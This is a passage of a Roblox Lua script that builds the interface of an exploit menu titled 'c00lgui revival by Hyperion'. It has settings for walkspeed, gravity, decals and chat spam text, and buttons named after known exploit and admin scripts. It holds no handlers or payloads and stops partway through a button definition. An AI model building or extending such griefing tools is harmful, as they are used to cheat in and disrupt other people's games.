-- Gui to Lua
-- Version: 3.2

-- Instances:

local CoolGui = Instance.new("ScreenGui")
local cope = Instance.new("TextButton")
local settings = Instance.new("Frame")
local titles = Instance.new("TextLabel")
local smain = Instance.new("Frame")
local sdidlabel = Instance.new("TextLabel")
local bgtlabel = Instance.new("TextLabel")
local sdid = Instance.new("TextBox")
local bgt = Instance.new("TextBox")
local swsjhlabel = Instance.new("TextLabel")
local sglabel = Instance.new("TextLabel")
local swsjh = Instance.new("TextBox")
local sg = Instance.new("TextBox")
local sidlabel = Instance.new("TextLabel")
local sid = Instance.new("TextBox")
local fps = Instance.new("TextLabel")
local size = Instance.new("TextLabel")
local time = Instance.new("TextLabel")
local checkrfe = Instance.new("TextLabel")
local suslabel = Instance.new("TextLabel")
local sus = Instance.new("TextBox")
local rlabel = Instance.new("TextLabel")
local glabel = Instance.new("TextLabel")
local blabel = Instance.new("TextLabel")
local r = Instance.new("TextBox")
local g = Instance.new("TextBox")
local b = Instance.new("TextBox")
local stlabel = Instance.new("TextLabel")
local st = Instance.new("TextBox")
local sbutton = Instance.new("TextButton")
local main = Instance.new("Frame")
local title = Instance.new("TextLabel")
local left = Instance.new("TextButton")
local right = Instance.new("TextButton")
local page1 = Instance.new("Frame")
local fes = Instance.new("Frame")
local sectitle = Instance.new("TextLabel")
local button = Instance.new("TextButton")
local button_2 = Instance.new("TextButton")
local button_3 = Instance.new("TextButton")
local button_4 = Instance.new("TextButton")
local button_5 = Instance.new("TextButton")
local button_6 = Instance.new("TextButton")
local button_7 = Instance.new("TextButton")
local button_8 = Instance.new("TextButton")
local button_9 = Instance.new("TextButton")
local button_10 = Instance.new("TextButton")
local button_11 = Instance.new("TextButton")
local button_12 = Instance.new("TextButton")
local button_13 = Instance.new("TextButton")
local button_14 = Instance.new("TextButton")
local lp = Instance.new("Frame")
local sectitle_2 = Instance.new("TextLabel")
local button_15 = Instance.new("TextButton")
local button_16 = Instance.new("TextButton")
local button_17 = Instance.new("TextButton")
local button_18 = Instance.new("TextButton")
local button_19 = Instance.new("TextButton")
local button_20 = Instance.new("TextButton")
local button_21 = Instance.new("TextButton")
local button_22 = Instance.new("TextButton")
local button_23 = Instance.new("TextButton")
local button_24 = Instance.new("TextButton")
local pgname = Instance.new("TextLabel")
local page3 = Instance.new("Frame")
local guir = Instance.new("Frame")
local sectitle_3 = Instance.new("TextLabel")
local button_25 = Instance.new("TextButton")
local button_26 = Instance.new("TextButton")
local button_27 = Instance.new("TextButton")
local button_28 = Instance.new("TextButton")
local button_29 = Instance.new("TextButton")
local button_30 = Instance.new("TextButton")
local button_31 = Instance.new("TextButton")
local button_32 = Instance.new("TextButton")
local button_33 = Instance.new("TextButton")
local button_34 = Instance.new("TextButton")
local misc = Instance.new("Frame")
local sectitle_4 = Instance.new("TextLabel")
local button_35 = Instance.new("TextButton")
local button_36 = Instance.new("TextButton")
local button_37 = Instance.new("TextButton")
local button_38 = Instance.new("TextButton")
local button_39 = Instance.new("TextButton")
local button_40 = Instance.new("TextButton")
local button_41 = Instance.new("TextButton")
local button_42 = Instance.new("TextButton")
local pgname_2 = Instance.new("TextLabel")
local page2 = Instance.new("Frame")
local fds = Instance.new("Frame")
local sectitle_5 = Instance.new("TextLabel")
local button_43 = Instance.new("TextButton")
local button_44 = Instance.new("TextButton")
local button_45 = Instance.new("TextButton")
local button_46 = Instance.new("TextButton")
local btools = Instance.new("Frame")
local sectitle_6 = Instance.new("TextLabel")
local button_47 = Instance.new("TextButton")
local button_48 = Instance.new("TextButton")
local button_49 = Instance.new("TextButton")
local button_50 = Instance.new("TextButton")
local button_51 = Instance.new("TextButton")
local button_52 = Instance.new("TextButton")
local button_53 = Instance.new("TextButton")
local button_54 = Instance.new("TextButton")
local button_55 = Instance.new("TextButton")
local button_56 = Instance.new("TextButton")
local button_57 = Instance.new("TextButton")
local pgname_3 = Instance.new("TextLabel")
local page4 = Instance.new("Frame")
local pres = Instance.new("Frame")
local sectitle_7 = Instance.new("TextLabel")
local button_58 = Instance.new("TextButton")
local button_59 = Instance.new("TextButton")
local button_60 = Instance.new("TextButton")
local button_61 = Instance.new("TextButton")
local button_62 = Instance.new("TextButton")
local button_63 = Instance.new("TextButton")
local creds = Instance.new("Frame")
local credits = Instance.new("TextLabel")
local pgname_4 = Instance.new("TextLabel")

--Properties:

CoolGui.Name = "CoolGui"
CoolGui.Parent = game.Players.LocalPlayer.PlayerGui
CoolGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
CoolGui.ResetOnSpawn = false

cope.Name = "cope"
cope.Parent = CoolGui
cope.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
cope.BorderColor3 = Color3.fromRGB(255, 0, 0)
cope.BorderSizePixel = 3
cope.LayoutOrder = 13
cope.Position = UDim2.new(-0.000998668605, 0, 0.962397218, 0)
cope.Size = UDim2.new(0, 300, 0, 20)
cope.ZIndex = 3
cope.Font = Enum.Font.SourceSans
cope.Text = "Close"
cope.TextColor3 = Color3.fromRGB(255, 255, 255)
cope.TextSize = 18.000

settings.Name = "settings"
settings.Parent = CoolGui
settings.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
settings.BorderColor3 = Color3.fromRGB(255, 0, 0)
settings.BorderSizePixel = 3
settings.Position = UDim2.new(0.280000001, 3, 0.294712126, 0)
settings.Size = UDim2.new(0, 300, 0, 400)
settings.ZIndex = 2

titles.Name = "titles"
titles.Parent = settings
titles.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
titles.BorderColor3 = Color3.fromRGB(255, 0, 0)
titles.BorderSizePixel = 3
titles.LayoutOrder = 3
titles.Size = UDim2.new(0, 300, 0, 40)
titles.Font = Enum.Font.SourceSans
titles.Text = "Settings"
titles.TextColor3 = Color3.fromRGB(255, 255, 255)
titles.TextSize = 24.000

smain.Name = "smain"
smain.Parent = settings
smain.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
smain.BorderColor3 = Color3.fromRGB(255, 0, 0)
smain.BorderSizePixel = 3
smain.Position = UDim2.new(0.00333363842, 0, 0.100000001, 0)
smain.Size = UDim2.new(0, 298, 0, 359)

sdidlabel.Name = "sdidlabel"
sdidlabel.Parent = smain
sdidlabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
sdidlabel.BorderColor3 = Color3.fromRGB(255, 0, 0)
sdidlabel.BorderSizePixel = 3
sdidlabel.Size = UDim2.new(0, 149, 0, 33)
sdidlabel.ZIndex = 3
sdidlabel.Font = Enum.Font.SourceSansBold
sdidlabel.Text = "Skybox/Decal ID"
sdidlabel.TextColor3 = Color3.fromRGB(255, 255, 255)
sdidlabel.TextSize = 14.000

bgtlabel.Name = "bgtlabel"
bgtlabel.Parent = smain
bgtlabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
bgtlabel.BorderColor3 = Color3.fromRGB(255, 0, 0)
bgtlabel.BorderSizePixel = 3
bgtlabel.Position = UDim2.new(0.5, 0, 0, 0)
bgtlabel.Size = UDim2.new(0, 149, 0, 33)
bgtlabel.ZIndex = 3
bgtlabel.Font = Enum.Font.SourceSansBold
bgtlabel.Text = "Billboard Gui Text"
bgtlabel.TextColor3 = Color3.fromRGB(255, 255, 255)
bgtlabel.TextSize = 14.000

sdid.Name = "sdid"
sdid.Parent = smain
sdid.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
sdid.BorderColor3 = Color3.fromRGB(255, 0, 0)
sdid.BorderSizePixel = 3
sdid.Position = UDim2.new(0, 0, 0.0919220075, 0)
sdid.Size = UDim2.new(0, 149, 0, 28)
sdid.ZIndex = 3
sdid.Font = Enum.Font.SourceSans
sdid.Text = "15475953475"
sdid.TextColor3 = Color3.fromRGB(255, 255, 255)
sdid.TextSize = 14.000
sdid.TextWrapped = true

bgt.Name = "bgt"
bgt.Parent = smain
bgt.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
bgt.BorderColor3 = Color3.fromRGB(255, 0, 0)
bgt.BorderSizePixel = 3
bgt.Position = UDim2.new(0.5, 0, 0.0919220075, 0)
bgt.Size = UDim2.new(0, 149, 0, 28)
bgt.ZIndex = 3
bgt.Font = Enum.Font.SourceSans
bgt.Text = "c00lkidd"
bgt.TextColor3 = Color3.fromRGB(255, 255, 255)
bgt.TextSize = 14.000
bgt.TextWrapped = true

swsjhlabel.Name = "swsjhlabel"
swsjhlabel.Parent = smain
swsjhlabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
swsjhlabel.BorderColor3 = Color3.fromRGB(255, 0, 0)
swsjhlabel.BorderSizePixel = 3
swsjhlabel.Position = UDim2.new(0, 0, 0.169916436, 0)
swsjhlabel.Size = UDim2.new(0, 74, 0, 33)
swsjhlabel.ZIndex = 3
swsjhlabel.Font = Enum.Font.SourceSansBold
swsjhlabel.Text = "Set WS/JH"
swsjhlabel.TextColor3 = Color3.fromRGB(255, 255, 255)
swsjhlabel.TextSize = 14.000

sglabel.Name = "sglabel"
sglabel.Parent = smain
sglabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
sglabel.BorderColor3 = Color3.fromRGB(255, 0, 0)
sglabel.BorderSizePixel = 3
sglabel.Position = UDim2.new(0.241610736, 0, 0.169916436, 0)
sglabel.Size = UDim2.new(0, 74, 0, 33)
sglabel.ZIndex = 3
sglabel.Font = Enum.Font.SourceSansBold
sglabel.Text = "Set Gravity"
sglabel.TextColor3 = Color3.fromRGB(255, 255, 255)
sglabel.TextSize = 14.000

swsjh.Name = "swsjh"
swsjh.Parent = smain
swsjh.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
swsjh.BorderColor3 = Color3.fromRGB(255, 0, 0)
swsjh.BorderSizePixel = 3
swsjh.Position = UDim2.new(0, 0, 0.261838436, 0)
swsjh.Size = UDim2.new(0, 72, 0, 28)
swsjh.ZIndex = 3
swsjh.Font = Enum.Font.SourceSans
swsjh.Text = "50"
swsjh.TextColor3 = Color3.fromRGB(255, 255, 255)
swsjh.TextSize = 14.000
swsjh.TextWrapped = true

sg.Name = "sg"
sg.Parent = smain
sg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
sg.BorderColor3 = Color3.fromRGB(255, 0, 0)
sg.BorderSizePixel = 3
sg.Position = UDim2.new(0.241610736, 0, 0.261838436, 0)
sg.Size = UDim2.new(0, 74, 0, 28)
sg.ZIndex = 3
sg.Font = Enum.Font.SourceSans
sg.Text = "100"
sg.TextColor3 = Color3.fromRGB(255, 255, 255)
sg.TextSize = 14.000
sg.TextWrapped = true

sidlabel.Name = "sidlabel"
sidlabel.Parent = smain
sidlabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
sidlabel.BorderColor3 = Color3.fromRGB(255, 0, 0)
sidlabel.BorderSizePixel = 3
sidlabel.Position = UDim2.new(0.5, 0, 0.169916436, 0)
sidlabel.Size = UDim2.new(0, 149, 0, 33)
sidlabel.ZIndex = 3
sidlabel.Font = Enum.Font.SourceSansBold
sidlabel.Text = "Music ID"
sidlabel.TextColor3 = Color3.fromRGB(255, 255, 255)
sidlabel.TextSize = 14.000

sid.Name = "sid"
sid.Parent = smain
sid.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
sid.BorderColor3 = Color3.fromRGB(255, 0, 0)
sid.BorderSizePixel = 3
sid.Position = UDim2.new(0.5, 0, 0.261838436, 0)
sid.Size = UDim2.new(0, 149, 0, 28)
sid.ZIndex = 3
sid.Font = Enum.Font.SourceSans
sid.Text = ""
sid.TextColor3 = Color3.fromRGB(255, 255, 255)
sid.TextSize = 14.000
sid.TextWrapped = true

fps.Name = "fps"
fps.Parent = smain
fps.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
fps.BorderColor3 = Color3.fromRGB(255, 0, 0)
fps.BorderSizePixel = 3
fps.Position = UDim2.new(0, 0, 0.339832872, 0)
fps.Size = UDim2.new(0, 149, 0, 33)
fps.ZIndex = 3
fps.Font = Enum.Font.SourceSans
fps.Text = "FPS: "
fps.TextColor3 = Color3.fromRGB(255, 255, 255)
fps.TextSize = 14.000

size.Name = "size"
size.Parent = smain
size.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
size.BorderColor3 = Color3.fromRGB(255, 0, 0)
size.BorderSizePixel = 3
size.Position = UDim2.new(0, 0, 0.431754887, 0)
size.Size = UDim2.new(0, 149, 0, 33)
size.ZIndex = 3
size.Font = Enum.Font.SourceSans
size.Text = "Server Size: "
size.TextColor3 = Color3.fromRGB(255, 255, 255)
size.TextSize = 14.000

time.Name = "time"
time.Parent = smain
time.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
time.BorderColor3 = Color3.fromRGB(255, 0, 0)
time.BorderSizePixel = 3
time.Position = UDim2.new(0, 0, 0.523676872, 0)
time.Size = UDim2.new(0, 149, 0, 33)
time.ZIndex = 3
time.Font = Enum.Font.SourceSans
time.Text = "Server Time: "
time.TextColor3 = Color3.fromRGB(255, 255, 255)
time.TextSize = 14.000
time.TextWrapped = true

checkrfe.Name = "checkrfe"
checkrfe.Parent = smain
checkrfe.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
checkrfe.BorderColor3 = Color3.fromRGB(255, 0, 0)
checkrfe.BorderSizePixel = 3
checkrfe.Position = UDim2.new(0.5, 0, 0.339832872, 0)
checkrfe.Size = UDim2.new(0, 149, 0, 33)
checkrfe.ZIndex = 3
checkrfe.Font = Enum.Font.SourceSans
checkrfe.Text = "Loading.."
checkrfe.TextColor3 = Color3.fromRGB(255, 255, 255)
checkrfe.TextSize = 14.000
checkrfe.TextWrapped = true

suslabel.Name = "suslabel"
suslabel.Parent = smain
suslabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
suslabel.BorderColor3 = Color3.fromRGB(255, 0, 0)
suslabel.BorderSizePixel = 3
suslabel.Position = UDim2.new(0, 0, 0.615598857, 0)
suslabel.Size = UDim2.new(0, 146, 0, 33)
suslabel.ZIndex = 3
suslabel.Font = Enum.Font.SourceSansBold
suslabel.Text = "Set Username"
suslabel.TextColor3 = Color3.fromRGB(255, 255, 255)
suslabel.TextSize = 14.000

sus.Name = "sus"
sus.Parent = smain
sus.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
sus.BorderColor3 = Color3.fromRGB(255, 0, 0)
sus.BorderSizePixel = 3
sus.Position = UDim2.new(0, 0, 0.707520902, 0)
sus.Size = UDim2.new(0, 146, 0, 28)
sus.ZIndex = 3
sus.Font = Enum.Font.SourceSans
sus.Text = "c00lkidd"
sus.TextColor3 = Color3.fromRGB(255, 255, 255)
sus.TextSize = 14.000
sus.TextWrapped = true

rlabel.Name = "rlabel"
rlabel.Parent = smain
rlabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
rlabel.BorderColor3 = Color3.fromRGB(255, 0, 0)
rlabel.BorderSizePixel = 3
rlabel.Position = UDim2.new(0.5, 0, 0.615598857, 0)
rlabel.Size = UDim2.new(0, 49, 0, 33)
rlabel.ZIndex = 3
rlabel.Font = Enum.Font.SourceSansBold
rlabel.Text = "R"
rlabel.TextColor3 = Color3.fromRGB(255, 255, 255)
rlabel.TextSize = 14.000

glabel.Name = "glabel"
glabel.Parent = smain
glabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
glabel.BorderColor3 = Color3.fromRGB(255, 0, 0)
glabel.BorderSizePixel = 3
glabel.Position = UDim2.new(0.667785227, 0, 0.615598857, 0)
glabel.Size = UDim2.new(0, 49, 0, 33)
glabel.ZIndex = 3
glabel.Font = Enum.Font.SourceSansBold
glabel.Text = "G"
glabel.TextColor3 = Color3.fromRGB(255, 255, 255)
glabel.TextSize = 14.000

blabel.Name = "blabel"
blabel.Parent = smain
blabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
blabel.BorderColor3 = Color3.fromRGB(255, 0, 0)
blabel.BorderSizePixel = 3
blabel.Position = UDim2.new(0.832214773, 0, 0.615598857, 0)
blabel.Size = UDim2.new(0, 49, 0, 33)
blabel.ZIndex = 3
blabel.Font = Enum.Font.SourceSansBold
blabel.Text = "B"
blabel.TextColor3 = Color3.fromRGB(255, 255, 255)
blabel.TextSize = 14.000

r.Name = "r"
r.Parent = smain
r.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
r.BorderColor3 = Color3.fromRGB(255, 0, 0)
r.BorderSizePixel = 3
r.Position = UDim2.new(0.5, 0, 0.707520902, 0)
r.Size = UDim2.new(0, 50, 0, 28)
r.ZIndex = 3
r.Font = Enum.Font.SourceSans
r.Text = "255"
r.TextColor3 = Color3.fromRGB(255, 255, 255)
r.TextSize = 14.000
r.TextWrapped = true

g.Name = "g"
g.Parent = smain
g.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
g.BorderColor3 = Color3.fromRGB(255, 0, 0)
g.BorderSizePixel = 3
g.Position = UDim2.new(0.667785227, 0, 0.707520902, 0)
g.Size = UDim2.new(0, 50, 0, 28)
g.ZIndex = 3
g.Font = Enum.Font.SourceSans
g.Text = "0"
g.TextColor3 = Color3.fromRGB(255, 255, 255)
g.TextSize = 14.000
g.TextWrapped = true

b.Name = "b"
b.Parent = smain
b.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
b.BorderColor3 = Color3.fromRGB(255, 0, 0)
b.BorderSizePixel = 3
b.Position = UDim2.new(0.832214773, 0, 0.707520902, 0)
b.Size = UDim2.new(0, 50, 0, 28)
b.ZIndex = 3
b.Font = Enum.Font.SourceSans
b.Text = "0"
b.TextColor3 = Color3.fromRGB(255, 255, 255)
b.TextSize = 14.000
b.TextWrapped = true

stlabel.Name = "stlabel"
stlabel.Parent = smain
stlabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
stlabel.BorderColor3 = Color3.fromRGB(255, 0, 0)
stlabel.BorderSizePixel = 3
stlabel.Position = UDim2.new(0.5, 0, 0.431754887, 0)
stlabel.Size = UDim2.new(0, 148, 0, 33)
stlabel.ZIndex = 3
stlabel.Font = Enum.Font.SourceSansBold
stlabel.Text = "Set Spam Text"
stlabel.TextColor3 = Color3.fromRGB(255, 255, 255)
stlabel.TextSize = 14.000

st.Name = "st"
st.Parent = smain
st.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
st.BorderColor3 = Color3.fromRGB(255, 0, 0)
st.BorderSizePixel = 3
st.Position = UDim2.new(0.5, 0, 0.523676872, 0)
st.Size = UDim2.new(0, 149, 0, 30)
st.ZIndex = 4
st.Font = Enum.Font.SourceSans
st.Text = "join team c00lkidd!"
st.TextColor3 = Color3.fromRGB(255, 255, 255)
st.TextSize = 14.000
st.TextWrapped = true

sbutton.Name = "sbutton"
sbutton.Parent = settings
sbutton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
sbutton.BorderColor3 = Color3.fromRGB(255, 0, 0)
sbutton.BorderSizePixel = 3
sbutton.Position = UDim2.new(1, 0, 0, 0)
sbutton.Size = UDim2.new(0, 27, 1, 0)
sbutton.ZIndex = 2
sbutton.Font = Enum.Font.SourceSans
sbutton.Text = "<"
sbutton.TextColor3 = Color3.fromRGB(255, 255, 255)
sbutton.TextSize = 48.000

main.Name = "main"
main.Parent = CoolGui
main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
main.BorderColor3 = Color3.fromRGB(255, 0, 0)
main.BorderSizePixel = 3
main.Position = UDim2.new(-0.00299600535, 3, 0.294712126, 0)
main.Size = UDim2.new(0, 300, 0, 400)
main.ZIndex = 2

title.Name = "title"
title.Parent = main
title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
title.BorderColor3 = Color3.fromRGB(255, 0, 0)
title.BorderSizePixel = 3
title.LayoutOrder = 3
title.Position = UDim2.new(-0.00333333341, 0, 0, 0)
title.Size = UDim2.new(0, 300, 0, 40)
title.Font = Enum.Font.SourceSans
title.Text = "c00lgui revival by Hyperion"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 24.000

left.Name = "left"
left.Parent = main
left.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
left.BorderColor3 = Color3.fromRGB(255, 0, 0)
left.BorderSizePixel = 3
left.Position = UDim2.new(0, 0, 0.100000001, 0)
left.Size = UDim2.new(0, 149, 0, 33)
left.Font = Enum.Font.SourceSans
left.Text = "<"
left.TextColor3 = Color3.fromRGB(255, 255, 255)
left.TextSize = 48.000

right.Name = "right"
right.Parent = main
right.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
right.BorderColor3 = Color3.fromRGB(255, 0, 0)
right.BorderSizePixel = 3
right.Position = UDim2.new(0.49666667, 0, 0.100000001, 0)
right.Size = UDim2.new(0, 149, 0, 33)
right.Font = Enum.Font.SourceSans
right.Text = ">"
right.TextColor3 = Color3.fromRGB(255, 255, 255)
right.TextSize = 48.000

page1.Name = "page1"
page1.Parent = main
page1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
page1.BorderColor3 = Color3.fromRGB(255, 0, 0)
page1.BorderSizePixel = 3
page1.Position = UDim2.new(0, 0, 0.182500005, 0)
page1.Size = UDim2.new(0, 298, 0, 306)

fes.Name = "fes"
fes.Parent = page1
fes.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
fes.BorderColor3 = Color3.fromRGB(255, 0, 0)
fes.BorderSizePixel = 3
fes.Size = UDim2.new(0, 149, 0, 306)

sectitle.Name = "sectitle"
sectitle.Parent = fes
sectitle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
sectitle.BorderColor3 = Color3.fromRGB(255, 0, 0)
sectitle.BorderSizePixel = 3
sectitle.Size = UDim2.new(0, 149, 0, 30)
sectitle.Font = Enum.Font.SourceSansBold
sectitle.Text = "FE Scripts"
sectitle.TextColor3 = Color3.fromRGB(255, 255, 255)
sectitle.TextSize = 14.000

button.Name = "button"
button.Parent = fes
button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button.BorderColor3 = Color3.fromRGB(255, 0, 0)
button.BorderSizePixel = 3
button.Position = UDim2.new(0, 0, 0.0980392173, 0)
button.Size = UDim2.new(0, 71, 0, 25)
button.Font = Enum.Font.SourceSans
button.Text = "Glitch Sound"
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.TextSize = 14.000

button_2.Name = "button"
button_2.Parent = fes
button_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_2.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_2.BorderSizePixel = 3
button_2.Position = UDim2.new(0.523489952, 0, 0.0980392173, 0)
button_2.Size = UDim2.new(0, 71, 0, 25)
button_2.Font = Enum.Font.SourceSans
button_2.Text = "Dank Engine"
button_2.TextColor3 = Color3.fromRGB(255, 255, 255)
button_2.TextSize = 14.000

button_3.Name = "button"
button_3.Parent = fes
button_3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_3.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_3.BorderSizePixel = 3
button_3.Position = UDim2.new(0, 0, 0.179738566, 0)
button_3.Size = UDim2.new(0, 71, 0, 25)
button_3.Font = Enum.Font.SourceSans
button_3.Text = "Lightsaber"
button_3.TextColor3 = Color3.fromRGB(255, 255, 255)
button_3.TextSize = 14.000

button_4.Name = "button"
button_4.Parent = fes
button_4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_4.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_4.BorderSizePixel = 3
button_4.Position = UDim2.new(0.523489952, 0, 0.179738566, 0)
button_4.Size = UDim2.new(0, 71, 0, 25)
button_4.Font = Enum.Font.SourceSans
button_4.Text = "sing c00lkidd"
button_4.TextColor3 = Color3.fromRGB(255, 255, 255)
button_4.TextSize = 14.000

button_5.Name = "button"
button_5.Parent = fes
button_5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_5.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_5.BorderSizePixel = 3
button_5.Position = UDim2.new(0, 0, 0.261437923, 0)
button_5.Size = UDim2.new(0, 71, 0, 25)
button_5.Font = Enum.Font.SourceSans
button_5.Text = "Nameless FE"
button_5.TextColor3 = Color3.fromRGB(255, 255, 255)
button_5.TextSize = 14.000

button_6.Name = "button"
button_6.Parent = fes
button_6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_6.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_6.BorderSizePixel = 3
button_6.Position = UDim2.new(0.523489952, 0, 0.261437923, 0)
button_6.Size = UDim2.new(0, 71, 0, 25)
button_6.Font = Enum.Font.SourceSans
button_6.Text = "Infinite Yield"
button_6.TextColor3 = Color3.fromRGB(255, 255, 255)
button_6.TextSize = 14.000

button_7.Name = "button"
button_7.Parent = fes
button_7.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_7.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_7.BorderSizePixel = 3
button_7.Position = UDim2.new(0, 0, 0.343137264, 0)
button_7.Size = UDim2.new(0, 71, 0, 25)
button_7.Font = Enum.Font.SourceSans
button_7.Text = "Fedora Admin"
button_7.TextColor3 = Color3.fromRGB(255, 255, 255)
button_7.TextSize = 14.000

button_8.Name = "button"
button_8.Parent = fes
button_8.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_8.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_8.BorderSizePixel = 3
button_8.Position = UDim2.new(0.523489952, 0, 0.343137264, 0)
button_8.Size = UDim2.new(0, 71, 0, 25)
button_8.Font = Enum.Font.SourceSans
button_8.Text = "OPFinality"
button_8.TextColor3 = Color3.fromRGB(255, 255, 255)
button_8.TextSize = 14.000

button_9.Name = "button"
button_9.Parent = fes
button_9.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_9.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_9.BorderSizePixel = 3
button_9.Position = UDim2.new(0, 0, 0.424836606, 0)
button_9.Size = UDim2.new(0, 71, 0, 25)
button_9.Font = Enum.Font.SourceSans
button_9.Text = "Illuminati"
button_9.TextColor3 = Color3.fromRGB(255, 255, 255)
button_9.TextSize = 14.000

button_10.Name = "button"
button_10.Parent = fes
button_10.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_10.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_10.BorderSizePixel = 3
button_10.Position = UDim2.new(0.523489952, 0, 0.424836606, 0)
button_10.Size = UDim2.new(0, 71, 0, 25)
button_10.Font = Enum.Font.SourceSans
button_10.Text = "Script Hub"
button_10.TextColor3 = Color3.fromRGB(255, 255, 255)
button_10.TextSize = 14.000

button_11.Name = "button"
button_11.Parent = fes
button_11.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_11.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_11.BorderSizePixel = 3
button_11.Position = UDim2.new(0, 0, 0.506535947, 0)
button_11.Size = UDim2.new(0, 71, 0, 25)
button_11.Font = Enum.Font.SourceSans
button_11.Text = "Rocky2u Admin"
button_11.TextColor3 = Color3.fromRGB(255, 255, 255)
button_11.TextSize = 14.000

button_12.Name = "button"
button_12.Parent = fes
button_12.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_12.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_12.BorderSizePixel = 3
button_12.Position = UDim2.new(0.523489952, 0, 0.506535947, 0)
button_12.Size = UDim2.new(0, 71, 0, 25)
button_12.Font = Enum.Font.SourceSans
button_12.Text = "Energize FE"
button_12.TextColor3 = Color3.fromRGB(255, 255, 255)
button_12.TextSize = 14.000

button_13.Name = "button"
button_13.Parent = fes
button_13.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_13.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_13.BorderSizePixel = 3
button_13.Position = UDim2.new(0, 0, 0.588235319, 0)
button_13.Size = UDim2.new(0, 71, 0, 25)
button_13.Font = Enum.Font.SourceSans
button_13.Text = "dev-uzi"
button_13.TextColor3 = Color3.fromRGB(255, 255, 255)
button_13.TextSize = 14.000

button_14.Name = "button"
button_14.Parent = fes
button_14.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_14.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_14.BorderSizePixel = 3
button_14.Position = UDim2.new(0.523489952, 0, 0.588235319, 0)
button_14.Size = UDim2.new(0, 71, 0, 25)
button_14.Font = Enum.Font.SourceSans
button_14.Text = "Unanchored2Plr"
button_14.TextColor3 = Color3.fromRGB(255, 255, 255)
button_14.TextSize = 14.000

lp.Name = "lp"
lp.Parent = page1
lp.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
lp.BorderColor3 = Color3.fromRGB(255, 0, 0)
lp.BorderSizePixel = 3
lp.Position = UDim2.new(0.5, 0, 0, 0)
lp.Size = UDim2.new(0, 149, 0, 306)

sectitle_2.Name = "sectitle"
sectitle_2.Parent = lp
sectitle_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
sectitle_2.BorderColor3 = Color3.fromRGB(255, 0, 0)
sectitle_2.BorderSizePixel = 3
sectitle_2.Size = UDim2.new(0, 149, 0, 30)
sectitle_2.Font = Enum.Font.SourceSansBold
sectitle_2.Text = "LocalPlayer"
sectitle_2.TextColor3 = Color3.fromRGB(255, 255, 255)
sectitle_2.TextSize = 14.000

button_15.Name = "button"
button_15.Parent = lp
button_15.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_15.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_15.BorderSizePixel = 3
button_15.Position = UDim2.new(0, 0, 0.0980392173, 0)
button_15.Size = UDim2.new(0, 71, 0, 25)
button_15.Font = Enum.Font.SourceSans
button_15.Text = "Billboard Gui"
button_15.TextColor3 = Color3.fromRGB(255, 255, 255)
button_15.TextSize = 14.000
button_15.TextWrapped = true

button_16.Name = "button"
button_16.Parent = lp
button_16.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
button_16.BorderColor3 = Color3.fromRGB(255, 0, 0)
button_16.BorderSizePixel = 3
